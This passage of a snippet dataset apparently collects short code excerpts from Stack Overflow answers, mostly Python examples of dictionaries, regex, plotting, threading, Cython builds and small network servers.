        self.b1 = Button(TimeAdjustLabel, text='Reset', width=10, command=lambda:self.Start(self.on))
        self.b1.grid(row=0, column=0)

    def Start(self, onoff):
        if onoff == 0:
            onoff = 1
        else: 
            onoff = 0
        self.enable(onoff)


    def enable(self,enableonoff):
        if enableonoff == 0:
            self.b1.configure(state='disabled')
        else: 
            self.b1.configure(state='normal')

def main():
    app = StopWatch(root)
    root.mainloop()

if __name__ == '__main__':
    main()
</snippet></ROW><ROW><id>20486666</id><snippet>-u all</snippet></ROW><ROW><id>20486731</id><snippet>sys.stdout.write()</snippet></ROW><ROW><id>20486731</id><snippet>1</snippet></ROW><ROW><id>20486731</id><snippet>&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.stdout.write("foo")
foo3
</snippet></ROW><ROW><id>20486731</id><snippet>&gt;&gt;&gt; nbytes = sys.stdout.write("foo\n")
foo
</snippet></ROW><ROW><id>20486769</id><snippet>scrapy crawl statsspider -a player_list=xyz,abc
</snippet></ROW><ROW><id>20486769</id><snippet>self.player_list = player_list.split(',')
</snippet></ROW><ROW><id>20486771</id><snippet>str</snippet></ROW><ROW><id>20486771</id><snippet>str</snippet></ROW><ROW><id>20486771</id><snippet>str_</snippet></ROW><ROW><id>20486771</id><snippet>str</snippet></ROW><ROW><id>20486771</id><snippet>str_</snippet></ROW><ROW><id>20486771</id><snippet>numpy.str_</snippet></ROW><ROW><id>20486969</id><snippet>b = []
for ...
   arg = {i: resp[i]}  # creates a new dict
   b.append(arg)  # adds the dict to the list
</snippet></ROW><ROW><id>20486969</id><snippet>b = {}
for ...
    b.update(arg)
</snippet></ROW><ROW><id>20486969</id><snippet>b = {}
for ...
   b[i] = resp[i]
</snippet></ROW><ROW><id>20487129</id><snippet>all</snippet></ROW><ROW><id>20487129</id><snippet>def primecheck_all(x):
    return all(prime(n) for n in x)
</snippet></ROW><ROW><id>20487129</id><snippet>def primecheck_longway(x):
    for n in x:
        if not prime(n):
            return False
    return True
</snippet></ROW><ROW><id>20487129</id><snippet>primecheck_longway</snippet></ROW><ROW><id>20487129</id><snippet>primecheck_all</snippet></ROW><ROW><id>20487129</id><snippet>primecheck_xrange</snippet></ROW><ROW><id>20487129</id><snippet>&gt;&gt;&gt; def prime(n): 
        #simple function so all timing goes to how the list check is done
        return n % 2 == 0

&gt;&gt;&gt; l = range(100)
&gt;&gt;&gt; timeit.timeit(lambda: primecheck_all(l))
1.4247075990295475
&gt;&gt;&gt; timeit.timeit(lambda: primecheck_longway(l))
0.6282418298159413
&gt;&gt;&gt; timeit.timeit(lambda: primecheck_xrange(l))
1.161489160644436

&gt;&gt;&gt; l = range(2,100,2)
&gt;&gt;&gt; timeit.timeit(lambda: primecheck_all(l))
10.058764784981875
&gt;&gt;&gt; timeit.timeit(lambda: primecheck_longway(l))
7.728265179204939
&gt;&gt;&gt; timeit.timeit(lambda: primecheck_xrange(l))
10.481824344034152
</snippet></ROW><ROW><id>20487197</id><snippet>with open("Input.txt") as inFile:
    for item in inFile:
        datePart, holiday = item.split(", ", 1)
        month, day = datePart.split()
</snippet></ROW><ROW><id>20487346</id><snippet>def remove_dups(d):
    c, result = {}, {}
    for item in d.values():
        c[item] = c.get(item, 0) + 1
    for k, v in d.items():
        if c[v] == 1:
            result[k] = v
    return result
</snippet></ROW><ROW><id>20487346</id><snippet>Counter</snippet></ROW><ROW><id>20487346</id><snippet>from collections import Counter
def remove_dups(d):
    c = Counter(d.values())
    return {k:v for k, v in d.items() if c[v] == 1}
</snippet></ROW><ROW><id>20487373</id><snippet>vim-pydocstring</snippet></ROW><ROW><id>20487535</id><snippet>.text</snippet></ROW><ROW><id>20487535</id><snippet>import urllib2
from BeautifulSoup import BeautifulSoup

url1 = "http://www.thrashermagazine.com/skateparks/search-results_m94/?cat=61&amp;jr_state=CA&amp;order=alpha&amp;query=all"
content1 = urllib2.urlopen(url1).read()
soup = BeautifulSoup(content1)
print [e.text for e in soup.findAll('a')]
</snippet></ROW><ROW><id>20487602</id><snippet>#!/usr/bin/env python

from subprocess import check_output


from circuits.web import Controller, Server


class Root(Controller):

    def index(self):
        return check_output("python hello.py", shell=True)


app = Server("0.0.0.0:5000")
Root().register(app)

app.run()
</snippet></ROW><ROW><id>20487605</id><snippet>#!/usr/bin/env python2.7
#coding: utf-8

import threading
import time


class Test:
    #set the max thread number
    threadLimiter = threading.BoundedSemaphore(10)

    def go(self):
        lstRecordThreads = []
        for i in range(1, 200):
            Test.threadLimiter.acquire()
            recordThread = threading.Thread(target=self.recordExec, args=(i,))
            recordThread.start()
            lstRecordThreads.append(recordThread)

        for rt in lstRecordThreads:
            rt.join()

    def recordExec(self, number):
        print "current number=["+str(number)+"]"
        time.sleep(1)
        print "done=["+str(number)+"]"
        print('Active thread count: %d' % (threading.active_count(),))        
        Test.threadLimiter.release()


if __name__ == '__main__':
    t = Test()
    t.go()
</snippet></ROW><ROW><id>20487665</id><snippet>Long</snippet></ROW><ROW><id>20487665</id><snippet>ansdb = {}
for row in prsnobj.result:
    ansdb[int(row[0])] = int(row[1])
</snippet></ROW><ROW><id>20487733</id><snippet>def f(n):
    return x%n

if all(f(element) for element in lst):
    ...
</snippet></ROW><ROW><id>20487733</id><snippet>if all(x % element for element in lst):
    ...
</snippet></ROW><ROW><id>20487983</id><snippet>sysctl -A | grep shm
</snippet></ROW><ROW><id>20487983</id><snippet>sudo nano /etc/sysctl.conf
</snippet></ROW><ROW><id>20488099</id><snippet>def eat_bacon():
    return 'Om nom nom.'

call_map = {'eat': eat_bacon} # here, I am using the name of method

y = raw_input('Type eat: ')
print call_map[y]()
</snippet></ROW><ROW><id>20488099</id><snippet>getattr</snippet></ROW><ROW><id>20488099</id><snippet>class OmNom(object):
  def __init__(self):
     self.bacon = True
  def eat(self):
     self.bacon = False
     return 'Om nom nom'

monster = OmNom()
y = raw_input('Type eat: ')
print getattr(monster, y)()
# This is the same as
# z = getattr(monster, 'eat')
# Now z points to the eat method of the object, then
# z() will call that method.
</snippet></ROW><ROW><id>20488788</id><snippet>multiprocessing</snippet></ROW><ROW><id>20488788</id><snippet>def run_process(record):
    result = ping(record)

pool = Pool(processes=10)
results = pool.map_async(run_process, [records])
for r in results.get():
    write_to_database(r)
</snippet></ROW><ROW><id>20488874</id><snippet>imshow</snippet></ROW><ROW><id>20488874</id><snippet>'none'</snippet></ROW><ROW><id>20488874</id><snippet>plt.imshow(mat, cmap=cm, interpolation='none')
</snippet></ROW><ROW><id>20489497</id><snippet>&gt;&gt;&gt; string_with_double_backslash = "Here is a double backslash: \\"
&gt;&gt;&gt; print(string_with_double_backslash)
Here is a double backslash: \
</snippet></ROW><ROW><id>20489581</id><snippet>&gt;&gt;&gt; import decimal
&gt;&gt;&gt; myothercontext = decimal.Context(rounding=decimal.ROUND_HALF_UP)
&gt;&gt;&gt; decimal.setcontext(myothercontext)
&gt;&gt;&gt; TWOPLACES = decimal.Decimal(10) ** -2
&gt;&gt;&gt; decimal.Decimal('111.175').quantize(TWOPLACES)
Decimal('111.18')
&gt;&gt;&gt; decimal.Decimal('1.175').quantize(TWOPLACES)
Decimal('1.18')
&gt;&gt;&gt; decimal.Decimal('11.175').quantize(TWOPLACES)
Decimal('11.18')
</snippet></ROW><ROW><id>20489629</id><snippet>d.items()</snippet></ROW><ROW><id>20489629</id><snippet>{key: value for key, value in d.items()}
</snippet></ROW><ROW><id>20489629</id><snippet>ValueError</snippet></ROW><ROW><id>20489629</id><snippet>for</snippet></ROW><ROW><id>20489629</id><snippet>&gt;&gt;&gt; d = {'a':1, 'b':2, 'c':3, 'd':4}
&gt;&gt;&gt; for key, value in d:
...     print key, value
... 
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
ValueError: need more than 1 value to unpack
</snippet></ROW><ROW><id>20489629</id><snippet>{k: v for k, v in d.items()}</snippet></ROW><ROW><id>20489629</id><snippet>d.copy()</snippet></ROW><ROW><id>20489784</id><snippet>fab build    # build the package in non-development mode
fab develop  # build the package in development mode
fab test     # run tie unit test suite
fab release  # run through a tested release cycle
</snippet></ROW><ROW><id>20489784</id><snippet>fab -l</snippet></ROW><ROW><id>20489784</id><snippet>fab help:&lt;name&gt;</snippet></ROW><ROW><id>20490035</id><snippet>data</snippet></ROW><ROW><id>20490035</id><snippet>Connection</snippet></ROW><ROW><id>20490035</id><snippet>Host</snippet></ROW><ROW><id>20490035</id><snippet>Host</snippet></ROW><ROW><id>20490035</id><snippet>payload={
    'grant_type': 'authorization_code', 
    'code': request.args['code'],
    'state': request.args['state'],
    'redirect_uri': 'http://xxx.xyz.com/request_listener',
}

url = 'https://serviceprovider.xxx.com/auth/j_oauth_resolve_access_code'

response = requests.post(url, data=payload, verify=False)
</snippet></ROW><ROW><id>20490615</id><snippet>google = oauth.remote_app('google',
                      base_url='https://www.google.com/accounts/',
                      authorize_url='https://accounts.google.com/o/oauth2/auth',
                      request_token_url=None,
                      request_token_params={'scope': 'https://www.googleapis.com/auth/userinfo.email',
                                            'response_type': 'code',
                                            'hd':'domain.com'},
                      access_token_url='https://accounts.google.com/o/oauth2/token',
                      access_token_method='POST',
                      access_token_params={'grant_type': 'authorization_code'},
                      consumer_key=GOOGLE_CLIENT_ID,
                      consumer_secret=GOOGLE_CLIENT_SECRET)               
</snippet></ROW><ROW><id>20490644</id><snippet>DATABASES['default']['host']</snippet></ROW><ROW><id>20490644</id><snippet>pg_hba.conf</snippet></ROW><ROW><id>20490644</id><snippet>host    db_name    user_name   192.168.1.1/32    md5
</snippet></ROW><ROW><id>20491171</id><snippet>^\(?\w{1,3}\s*[):.]\s*
</snippet></ROW><ROW><id>20491171</id><snippet>*</snippet></ROW><ROW><id>20491171</id><snippet>)</snippet></ROW><ROW><id>20491171</id><snippet>src = re.sub(r'^\([^)]*\)', '', src)</snippet></ROW><ROW><id>20491171</id><snippet>*</snippet></ROW><ROW><id>20491171</id><snippet>zero or more</snippet></ROW><ROW><id>20491171</id><snippet>{1,3}</snippet></ROW><ROW><id>20491171</id><snippet>.</snippet></ROW><ROW><id>20491171</id><snippet>:</snippet></ROW><ROW><id>20491197</id><snippet>cd D:\MyDir;
copy /b *.DAT _all.DAT;
load data local infile '_all.DAT' into table catasto.dm_import fields terminated by '|' lines terminated by '\n';
del _all.DAT;
</snippet></ROW><ROW><id>20491463</id><snippet>In [25]: d = {L[0]:list(L[1:]) for L in second}

In [26]: answer = [[k]+d[k] for k in first]

In [27]: answer
Out[27]: 
[['apple', 'a1', 'a2', 'a3', 'a4'],
 ['durian', 'd1', 'd2', 'd3', 'd4'],
 ['cherry', 'c1', 'c2', 'c3', 'c4'],
 ['egg', 'e1', 'e2', 'e3', 'e4'],
 ['banana', 'b1', 'b2', 'b3', 'b4']]
</snippet></ROW><ROW><id>20491664</id><snippet>else</snippet></ROW><ROW><id>20491664</id><snippet>a</snippet></ROW><ROW><id>20491664</id><snippet>b</snippet></ROW><ROW><id>20491664</id><snippet>c and d</snippet></ROW><ROW><id>20491664</id><snippet>or</snippet></ROW><ROW><id>20491664</id><snippet>not</snippet></ROW><ROW><id>20491664</id><snippet>else</snippet></ROW><ROW><id>20491664</id><snippet>if not (a or b or (c and d)):
    e()
</snippet></ROW><ROW><id>20491664</id><snippet>not</snippet></ROW><ROW><id>20491664</id><snippet>if not a and not b and not (c and d):
    e()
</snippet></ROW><ROW><id>20491664</id><snippet>if not a and not b and (not c or not d):
    e()
</snippet></ROW><ROW><id>20491748</id><snippet>reset_index()</snippet></ROW><ROW><id>20491748</id><snippet>df = df.reset_index(drop=True)
</snippet></ROW><ROW><id>20491791</id><snippet>def f(obj):
    for k,v in obj.__dict__.items():
        print k ,v
        if hasattr(v,'__dict__'):
            f(v)   
</snippet></ROW><ROW><id>20492009</id><snippet>40434976/(5000*60*24) = 5.62</snippet></ROW><ROW><id>20492040</id><snippet>my_long_string = (
    "foo"
    "bar"
    "baz"
)

print(my_long_string)
</snippet></ROW><ROW><id>20492055</id><snippet>v_sql = 'SELECT DISTINCT tblSeller.ID, tblSeller.Navn FROM tblResult INNER JOIN tblSeller ON tblResult.SellerID = tblSeller.ID WHERE (((tblSeller.Name)="Robert Smith" ))'
</snippet></ROW><ROW><id>20492055</id><snippet>v_sql = "SELECT DISTINCT tblSeller.ID, tblSeller.Navn FROM tblResult INNER JOIN tblSeller ON tblResult.SellerID = tblSeller.ID WHERE (((tblSeller.Name)=\"Robert Smith\" ))"
</snippet></ROW><ROW><id>20492055</id><snippet>'''</snippet></ROW><ROW><id>20492055</id><snippet>"""</snippet></ROW><ROW><id>20492055</id><snippet>v_sql = """
SELECT DISTINCT tblSeller.ID, tblSeller.Navn 
FROM tblResult INNER JOIN tblSeller ON tblResult.SellerID = tblSeller.ID
WHERE (((tblSeller.Name)=\"Robert Smith\" ))
"""
</snippet></ROW><ROW><id>20492578</id><snippet>to_mark</snippet></ROW><ROW><id>20492578</id><snippet>&gt;&gt;&gt; '\xc3\xa5'.encode('utf8')
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
UnicodeDecodeError: 'ascii' codec can't decode byte 0xc3 in position 0: ordinal not in range(128)
</snippet></ROW><ROW><id>20492578</id><snippet>json.dumps()</snippet></ROW><ROW><id>20492578</id><snippet>to_mark</snippet></ROW><ROW><id>20492578</id><snippet>str.decode()</snippet></ROW><ROW><id>20492578</id><snippet>text = to_mark.decode('utf8')
</snippet></ROW><ROW><id>20492634</id><snippet>reg = re.compile(r"(?&lt;!\d)(\(?\d{3}\D{0,3}\d{3}\D{0,3}\d{4})(?!\d)", re.S)
</snippet></ROW><ROW><id>20492634</id><snippet>^</snippet></ROW><ROW><id>20492634</id><snippet>$</snippet></ROW><ROW><id>20492634</id><snippet>'a1b2c'</snippet></ROW><ROW><id>20492634</id><snippet>a</snippet></ROW><ROW><id>20492634</id><snippet>b</snippet></ROW><ROW><id>20492634</id><snippet>c</snippet></ROW><ROW><id>20492634</id><snippet>(?&lt;!\d)</snippet></ROW><ROW><id>20492634</id><snippet>&gt;&gt;&gt; reg.search('0123456789')          # 10 digits
&lt;_sre.SRE_Match object at 0x1026ea468&gt;
&gt;&gt;&gt; reg.search('10123456789') is None # 11 digits
True
</snippet></ROW><ROW><id>20492980</id><snippet>values = ((3, "Foo"), (5, "Bar"))
for n in range(1, 101):
    res = ''.join(v for (k, v) in values if not n % k)
    print(res if res else n)
</snippet></ROW><ROW><id>20493504</id><snippet>/var/lib/ckan/default/</snippet></ROW><ROW><id>20493504</id><snippet>sudo chown -R www-data /var/lib/ckan/default
sudo chmod -R u+rwx /var/lib/ckan/default
</snippet></ROW><ROW><id>20493729</id><snippet>RefPredicate</snippet></ROW><ROW><id>20493729</id><snippet>class RefPredicate(Label):
   segment = models.OneToOneField(TestSegment, primary_key=True)
</snippet></ROW><ROW><id>20493729</id><snippet>primary_key</snippet></ROW><ROW><id>20493729</id><snippet>segment</snippet></ROW><ROW><id>20493729</id><snippet>TestSegment</snippet></ROW><ROW><id>20493729</id><snippet>segment_id</snippet></ROW><ROW><id>20493729</id><snippet>TestSegment</snippet></ROW><ROW><id>20493729</id><snippet>segment</snippet></ROW><ROW><id>20493729</id><snippet>id</snippet></ROW><ROW><id>20493943</id><snippet>filter</snippet></ROW><ROW><id>20493943</id><snippet>filters</snippet></ROW><ROW><id>20493943</id><snippet>selection</snippet></ROW><ROW><id>20493943</id><snippet>on_selection</snippet></ROW><ROW><id>20493984</id><snippet>chisq.test</snippet></ROW><ROW><id>20493984</id><snippet>chi2_contingency</snippet></ROW><ROW><id>20493984</id><snippet>&gt;&gt;&gt; arr = np.array([38,27,23,17,11,4,98,100,80,85,60,23]).reshape(2,-1)
&gt;&gt;&gt; arr
array([[ 38,  27,  23,  17,  11,   4],
       [ 98, 100,  80,  85,  60,  23]])
&gt;&gt;&gt; chi2, p, dof, expected = scipy.stats.chi2_contingency(arr)
&gt;&gt;&gt; chi2, p, dof
(7.0762165124844367, 0.21503342516989818, 5)
</snippet></ROW><ROW><id>20494366</id><snippet>import numpy as np
import matplotlib.pyplot as plt

d = '''
0 4194304
1 497420
 ... (put all the rest of the data in here)
'''

D = np.loadtxt(d.split('\n'))

x = D[:,0]
y = D[:,1]
y_ln = np.log(y)

n = D.shape[0]

A = np.array(([[x[j], 1] for j in range(n)]))
B = np.array(y_ln[0:n])

X = np.linalg.lstsq(A,B)[0]
a=X[0]; b=X[1]

# so now your fitted line is log(y) = a*x + b
# lets show it on a graph.
plt.figure()
plt.plot(x, a*x+b, '--')
plt.plot(x, y_ln, 'o')
plt.ylabel('log y')
plt.xlabel('x values')
plt.show()

# or use the original scales by transforming the data back again:

plt.figure()
plt.plot(x, np.exp(a*x+b), '--')
plt.plot(x, y, 'o')
plt.ylabel('y')
plt.xlabel('x values')
plt.yscale('log')
plt.show()
</snippet></ROW><ROW><id>20494366</id><snippet>n = 13
A = np.array(([[x[j], 1] for j in range(n)]))
B = np.array(yl[0:n])
A = np.array(([[x[j], 1] for j in range(n)]))
B = np.array(y_ln[0:n])

X = np.linalg.lstsq(A,B)[0]
a=X[0]; b=X[1]

plt.figure()
plt.plot(x[0:n], np.exp(a*x[0:n]+b), '--')
plt.plot(x, y, 'o')
plt.ylabel('y')
plt.xlabel('x values')
plt.yscale('log')
plt.show()
</snippet></ROW><ROW><id>20494439</id><snippet>x1 = [{'a':1,'b':"cat"}, {'a':2,'b':"parrot"}, {'a': 3, 'b': 'dog'}]
x2 = [{'a':2,'b':"dog"}, {'a':1,'b':"fish"}]
x1_d = {d['a']: d['b'] for d in x1}
x2_d = {d['a']: d['b'] for d in x2}
matched_keys = set(x1_d) &amp; set(x2_d)
result = {key: (x1_d[key], x2_d[key]) for key in matched_keys}
print result     # {1: ('cat', 'fish'), 2: ('parrot', 'dog')}
</snippet></ROW><ROW><id>20494565</id><snippet>import re
re.sub( ' *- *', '', txt )
</snippet></ROW><ROW><id>20494565</id><snippet>replace</snippet></ROW><ROW><id>20494565</id><snippet>high-rise</snippet></ROW><ROW><id>20494565</id><snippet>high  -rise</snippet></ROW><ROW><id>20494565</id><snippet>high - rise</snippet></ROW><ROW><id>20494573</id><snippet>initialization</snippet></ROW><ROW><id>20494573</id><snippet>[sample]
recipe = zc.recipe.egg:scripts
eggs = sample
interpreter = samplepy
initialization =
    import os
    os.environ['PATH'] = '${buildout:bin-directory}' + os.pathsep + os.environ['PATH']
</snippet></ROW><ROW><id>20494573</id><snippet>bin/</snippet></ROW><ROW><id>20494573</id><snippet>PATH</snippet></ROW><ROW><id>20494806</id><snippet>cdef</snippet></ROW><ROW><id>20494806</id><snippet>public</snippet></ROW><ROW><id>20494806</id><snippet>cdef int public func1(unsigned long l, float f):
    print(f)       # some python code
</snippet></ROW><ROW><id>20494806</id><snippet>from distutils.core import setup
from Cython.Distutils import build_ext
setup(
      cmdclass = {'build_ext': build_ext},
      name = 'My app',
      ext_modules = cythonize("yourext.pyx"),
)
</snippet></ROW><ROW><id>20494806</id><snippet>python setup.py build_ext --inplace</snippet></ROW><ROW><id>20494806</id><snippet>distutils</snippet></ROW><ROW><id>20494806</id><snippet>.c</snippet></ROW><ROW><id>20494806</id><snippet>func1</snippet></ROW><ROW><id>20494806</id><snippet>// test.c
#include "Python.h"
#include "yourext.h"

main()
{
    Py_Initialize(); // start python interpreter
    inityourext();   // run module yourext

    func1(12, 3.0);  // Lets use shared library...

    Py_Finalize();
}
</snippet></ROW><ROW><id>20494806</id><snippet>.pyd</snippet></ROW><ROW><id>20494806</id><snippet>#undef DL_IMPORT            # Undefines DL_IMPORT macro
#define DL_IMPORT(t) t      # Redefines it to do nothing...

__PYX_EXTERN_C DL_IMPORT(int) func1(unsigned long, float);
</snippet></ROW><ROW><id>20494806</id><snippet>gcc -shared yourext.c -IC:\Python27\include -LC:\Python27\libs -lpython27 -o libyourext.dll
</snippet></ROW><ROW><id>20494806</id><snippet>gcc test.c -IC:\Python27\include -LC:\Python27\libs -LD:\ -lpython27 -lyourext -o test.exe
</snippet></ROW><ROW><id>20494806</id><snippet>$ test
3.0
</snippet></ROW><ROW><id>20494834</id><snippet>except</snippet></ROW><ROW><id>20494834</id><snippet>import traceback
traceback.print_exc()
</snippet></ROW><ROW><id>20494834</id><snippet>import traceback
try:
    pass
    pass
    pass
    pass
    pass
    raise NameError("I dont like your name")
    pass
    pass
    pass
    pass
    pass
except Exception, e:
    traceback.print_exc()
</snippet></ROW><ROW><id>20494834</id><snippet>Traceback (most recent call last):
  File "/home/thefourtheye/Desktop/Test.py", line 8, in &lt;module&gt;
    raise NameError("I dont like your name")
NameError: I dont like your name
</snippet></ROW><ROW><id>20494958</id><snippet>with open("numberlist.txt") as f: # this auto closes the file after reading. It's good practice
    numbers = f.readlines() # numbers is a list of all the numbers(a list of lines in the file)
</snippet></ROW><ROW><id>20494958</id><snippet>numbers = [n.strip() for n in numbers] # takes out unwanted spaces on the ends
</snippet></ROW><ROW><id>20494958</id><snippet>numbers = [n[:-1] for n in numbers] # slices off the last character of each line/list item

for number in numbers:
    #do whatever you want here
</snippet></ROW><ROW><id>20494958</id><snippet>import re

n = ['1993-06-11 5570',
     '930611-5570',
     '930611 5570',
     '93 05115570',
     '1993 05 11 55 70',
     '1993 05 11 5570']

regex = '([0-9]+(?:[- ]?[0-9]+)*)'
match_nums = [re.search(regex, num) for num in n]
results = [i.groups() for i in match_nums]
for i in results:
    print i

('1993-06-11 5570',)
('930611-5570',)
('930611 5570',)
('93 05115570',)
('1993 05 11 55 70',)
('1993 05 11 5570',)
</snippet></ROW><ROW><id>20494994</id><snippet>fetch()</snippet></ROW><ROW><id>20494994</id><snippet>AsyncHTTPTestCase.fetch()</snippet></ROW><ROW><id>20494994</id><snippet>AsyncTestCase.wait()</snippet></ROW><ROW><id>20494994</id><snippet>wait()</snippet></ROW><ROW><id>20494994</id><snippet>wait()</snippet></ROW><ROW><id>20494994</id><snippet>self.stop()</snippet></ROW><ROW><id>20495156</id><snippet>field.label_tag</snippet></ROW><ROW><id>20495156</id><snippet>field.field</snippet></ROW><ROW><id>20495166</id><snippet>import wmi
c = wmi.WMI()
wql = "Select * From Win32_SerialPort"
for item in c.query(wql):
    print item
</snippet></ROW><ROW><id>20495502</id><snippet>Updating Plot</snippet></ROW><ROW><id>20495745</id><snippet>from twisted.internet import protocol, reactor

class Echo(protocol.Protocol):
    def dataReceived(self, data):
        self.transport.write(data)

class EchoFactory(protocol.Factory):
    def buildProtocol(self, addr):
        return Echo()

class Echo2(protocol.Protocol):
    def dataReceived(self, data):
        self.transport.write(data+" From 2")

class EchoFactory2(protocol.Factory):
    def buildProtocol(self, addr):
        return Echo2()

reactor.listenTCP(1234, EchoFactory())

reactor.listenTCP(1235, EchoFactory2())
reactor.run()
</snippet></ROW><ROW><id>20495928</id><snippet>import numpy as np
import matplotlib.pyplot as plt
from matplotlib.ticker import Locator


class MinorSymLogLocator(Locator):
    """
    Dynamically find minor tick positions based on the positions of
    major ticks for a symlog scaling.
    """
    def __init__(self, linthresh):
        """
        Ticks will be placed between the major ticks.
        The placement is linear for x between -linthresh and linthresh,
        otherwise its logarithmically
        """
        self.linthresh = linthresh

    def __call__(self):
        'Return the locations of the ticks'
        majorlocs = self.axis.get_majorticklocs()

        # iterate through minor locs
        minorlocs = []

        # handle the lowest part
        for i in xrange(1, len(majorlocs)):
            majorstep = majorlocs[i] - majorlocs[i-1]
            if abs(majorlocs[i-1] + majorstep/2) &lt; self.linthresh:
                ndivs = 10
            else:
                ndivs = 9
            minorstep = majorstep / ndivs
            locs = np.arange(majorlocs[i-1], majorlocs[i], minorstep)[1:]
            minorlocs.extend(locs)

        return self.raise_if_exceeds(np.array(minorlocs))

    def tick_values(self, vmin, vmax):
        raise NotImplementedError('Cannot get tick locations for a '
                                  '%s type.' % type(self))


x = np.linspace(-5, 5, 100)
y = x

plt.plot(x, y)
plt.yscale('symlog', linthreshy=1e-1)

yaxis = plt.gca().yaxis
yaxis.set_minor_locator(MinorSymLogLocator(1e-1))

plt.show()
</snippet></ROW><ROW><id>20496873</id><snippet>def flatten_dict(dct, output=None, prefix=None):
    if output is None:
        output = {}
    if prefix is None:
        prefix = []
    for key in dct:
        if isinstance(dct[key], dict):
            flatten_dict(dct[key], output, prefix + [key])
        else:
            output["_".join(prefix + [key])] = dct[key]
    return output
</snippet></ROW><ROW><id>20496873</id><snippet>{'soccer_X07_pool_1_matchs_2_teamA': 'Bidvest Wits', 
 'soccer_X07_pool_1_matchs_2_teamB': 'MP Black Aces',
 'soccer_X07_pool_1_matchs_1_matchStatus': 'OP', 
 ...}
</snippet></ROW><ROW><id>20497038</id><snippet>re.compile(r"\b([1-2]?\d(?:,\d)?)\s[y+]\s([1-2]?\d(?:,\d)?)\shouses\b")
</snippet></ROW><ROW><id>20497038</id><snippet>(?:,[0-9])?</snippet></ROW><ROW><id>20497038</id><snippet>1</snippet></ROW><ROW><id>20497038</id><snippet>2</snippet></ROW><ROW><id>20497038</id><snippet>0-9</snippet></ROW><ROW><id>20497038</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; demo = '8 y 13 houses, 13 y 8 houses, 13 y 13 houses, 8 y 8 houses, 120 y 8 houses, 8 y 120 houses, 13,5 y 8 houses, 13,5 y 120 houses'
&gt;&gt;&gt; pattern = re.compile(r"\b([1-2]?\d(?:,\d)?)\s[y+]\s([1-2]?\d(?:,\d)?)\shouses\b")
&gt;&gt;&gt; pattern.findall(demo)
[('8', '13'), ('13', '8'), ('13', '13'), ('8', '8'), ('13,5', '8')]
</snippet></ROW><ROW><id>20497109</id><snippet>def list_comp(l):
    return [x+1 for x in l]

def dict_comp(l):
    return {x+1:0 for x in l}

def set_comp(l):
    return {x+1 for x in l}

def generator(l):
    return (x+1 for x in l)
</snippet></ROW><ROW><id>20497109</id><snippet>Disassembly of list_comp:
  2           0 BUILD_LIST              0
              3 LOAD_FAST               0 (l)
              6 GET_ITER            
        &gt;&gt;    7 FOR_ITER               16 (to 26)
             10 STORE_FAST              1 (x)
             13 LOAD_FAST               1 (x)
             16 LOAD_CONST              1 (1)
             19 BINARY_ADD          
             20 LIST_APPEND             2
             23 JUMP_ABSOLUTE           7
        &gt;&gt;   26 RETURN_VALUE
Disassembly of dict_comp:
  5           0 LOAD_CONST              1 (&lt;code object &lt;dictcomp&gt; at 029DEE30)
              3 MAKE_FUNCTION           0
              6 LOAD_FAST               0 (l)
              9 GET_ITER            
             10 CALL_FUNCTION           1
             13 RETURN_VALUE  
Disassembly of set_comp:
  8           0 LOAD_CONST              1 (&lt;code object &lt;setcomp&gt; at 029DECC8)
              3 MAKE_FUNCTION           0
              6 LOAD_FAST               0 (l)
              9 GET_ITER            
             10 CALL_FUNCTION           1
             13 RETURN_VALUE  
Disassembly of generator:
 11           0 LOAD_CONST              1 (&lt;code object &lt;genexpr&gt; at 02A8FD58)
              3 MAKE_FUNCTION           0
              6 LOAD_FAST               0 (l)
              9 GET_ITER            
             10 CALL_FUNCTION           1
             13 RETURN_VALUE                     
</snippet></ROW><ROW><id>20497109</id><snippet>&lt;dictcomp&gt;</snippet></ROW><ROW><id>20497109</id><snippet>&lt;setcomp&gt;</snippet></ROW><ROW><id>20497109</id><snippet>&lt;genexpr&gt;</snippet></ROW><ROW><id>20497109</id><snippet>SET_ADD</snippet></ROW><ROW><id>20497109</id><snippet>LIST_APPEND</snippet></ROW><ROW><id>20497109</id><snippet>MAP_ADD</snippet></ROW><ROW><id>20497266</id><snippet>allowed_chars = ['-', '.', ' ', '\n']
with open("textfile.txt", "r") as fp:
    for line in fp:
        line_check = line
        for chars in allowed_chars:
            line_check = line_check.replace(chars, '')
        if line_check.isdigit():
            print "Good line:", line
        else:
            print "Bad line:", line
</snippet></ROW><ROW><id>20497729</id><snippet>from collections import defaultdict
testDictionary = defaultdict(list)
testDictionary["192.168.0.1"] = ["10.10.10.1", 22, 8080, 0]
if testDictionary[sourceIP]:
    testDictionary[sourceIP][-1] += 1
</snippet></ROW><ROW><id>20497729</id><snippet>for sourceIP, otherHeader in testDictionary.items():
    if otherHeader[0] == destinationIP:
        testDictionary[sourceIP][-1] += 1
</snippet></ROW><ROW><id>20497729</id><snippet>for sourceIP, otherHeader in testDictionary.items():
    if otherHeader[0] != destinationIP:
        testDictionary[sourceIP].append(["10.10.10.2", 22, 8080, 1])
    else:
        testDictionary[sourceIP][-1] += 1
</snippet></ROW><ROW><id>20497815</id><snippet>def positionExtractor(alist):
    return tuple(alist[0:3])

def velocityExtractor(alist):
    velocity = tuple(alist[3:6])
    return velocity + (np.sqrt(sum(x**2 for x in velocity)),)

def forcesExtractor(alist):
    forces = tuple(alist[6:9])
    return forces + (np.sqrt(sum(x**2 for x in forces)),)
</snippet></ROW><ROW><id>20497815</id><snippet>extractors = {
    'position' : positionExtractor,
    'velocity' : velocityExtractor,
    'forces' : forcesExtractor}
</snippet></ROW><ROW><id>20497815</id><snippet>result = extractors[quantity](alist)
</snippet></ROW><ROW><id>20497815</id><snippet>import numpy as np

class Extractor:
    def extract(self, alist):
        raise NotImplementedError()

class IndexRangeExtractor(Extractor):
    def __init__(self, fromIndex, toIndex):
        self.fromIndex = fromIndex
        self.toIndex = toIndex

    def extract(self, alist):
        return tuple(alist[self.fromIndex:self.toIndex])

class EuclideanDistanceExtractorDecorator(Extractor):
    def __init__(self, innerExtractor):
        self.innerExtractor = innerExtractor

    def extract(self, alist):
        innerResult = self.innerExtractor.extract(alist)
        distance = np.sqrt(sum(x**2 for x in innerResult))

        return innerResult + (distance,)

#... 

class ExtractorFactory:
    def __init__(self):
        self.extractors = {
            'position':IndexRangeExtractor(0, 3),
            'velocity':EuclideanDistanceExtractorDecorator(
                IndexRangeExtractor(3, 6)),
